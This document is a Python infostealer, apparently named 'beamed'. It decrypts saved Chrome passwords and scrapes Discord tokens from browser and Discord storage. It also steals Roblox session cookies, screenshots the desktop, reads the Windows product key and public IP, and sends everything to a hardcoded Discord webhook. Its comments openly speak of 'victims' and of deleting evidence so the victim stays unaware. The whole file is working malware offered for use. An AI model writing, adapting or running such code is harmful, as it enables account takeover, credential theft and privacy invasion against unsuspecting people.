import os
import subprocess

# Function to install missing libraries
def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip3", "install", package])
    except subprocess.CalledProcessError:
        print(f"Failed to install {package}. Please try manually.")

# Try-except blocks for importing and installing packages
try:
    import browser_cookie3 as steal
except ImportError:
    install_package("browser-cookie3")

try:
    import requests
except ImportError:
    install_package("requests")

try:
    import base64
except ImportError:
    install_package("base64")

try:
    import random
except ImportError:
    install_package("random")

try:
    import string
except ImportError:
    install_package("string")

try:
    import subprocess
except ImportError:
    install_package("subprocess")

try:
    import zipfile
except ImportError:
    install_package("zipfile")

try:
    import shutil
except ImportError:
    install_package("shutil")

try:
    import dhooks
except ImportError:
    install_package("dhooks")

try:
    import os
except ImportError:
    install_package("os")

try:
    import re
except ImportError:
    install_package("re")

try:
    import sys
except ImportError:
    install_package("sys")

try:
    import sqlite3
except ImportError:
    install_package("sqlite3")

try:
    import json
except ImportError:
    install_package("json")

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    install_package("cryptography")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    install_package("cryptography")

try:
    from cryptography.hazmat.backends import default_backend
except ImportError:
    install_package("cryptography")

try:
    from Crypto.Cipher import AES
except ImportError:
    install_package("pycryptodome")

try:
    from base64 import b64decode, b64encode
except ImportError:
    install_package("base64")

try:
    from dhooks import Webhook, Embed, File
except ImportError:
    install_package("dhooks")

try:
    from PIL import ImageGrab as image
except ImportError:
    install_package("Pillow")

try:
    from subprocess import Popen, PIPE
except ImportError:
    install_package("subprocess")

try:
    from json import loads, dumps
except ImportError:
    install_package("json")

try:
    from shutil import copyfile
except ImportError:
    install_package("shutil")

try:
    from sys import argv
except ImportError:
    install_package("sys")


DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']


def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None


if __name__ == "__main__":
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.saved()


# webhook functionality => collect rest of specified data, send it to our webhook
def upload():
    try:
        """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
        name = ''.join(random.choice(string.ascii_letters) for i in range (21))

        """upload our victim's desktop image to imgur => return the image link for later usage"""
        imgur = requests.post(
            r'https://api.imgur.com/3/upload.json', 
            headers = {"Authorization": "Client-ID fbcb755c15bc311"},
            data = {
                'key': 'fbcb755c15bc311', 
                'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
                'type': 'base64',
                'name': f'{name}.jpg',
                'title': f'{name}'})
        image = imgur.json()['data']['link']
        return image
    except:
        pass


def beamed():
    hook = Webhook('https://discord.com/api/webhooks/1285974094889615360/P9o1IF8sLXCDhnkcCuwYlFnlMygsH2_Tyrlujds6ayic1qQCopGnuWZbcrLYQHlGb7oE')
    try:
        hostname = requests.get("https://api.ipify.org").text
    except:
        pass


    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
    

    """screenshot victim's desktop"""
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

    """gather our .zip variables"""
    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        passwords = File(r'C:\ProgramData\passwords.zip')
    except:
        pass
    
    """gather our windows product key variables"""
    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except:
        pass

    """steal victim's .roblosecurity cookie"""
    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000

    """chrome installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass

    """firefox installation => list cookies from this location"""
    try:
        cookies.extend(list(steal.firefox()))
    except:
        pass

    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' + f'{z}' + '```'
    except:
        pass

    """attempt to send all recieved data to our specified webhook"""
    try:
        embed = Embed(title='beamed | lust, l-ust on github',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
        embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
        embed.add_field("roblosecurity:",roblox)
        embed.add_field("tokens:",message)
        embed.add_field("hostname:",f"{hostname}")
        embed.set_image(url=upload())
    except:
        pass
    try:
        hook.send(embed=embed, file=passwords)
    except:
        pass

    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
    try:
        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
    except:
        pass


beamed()
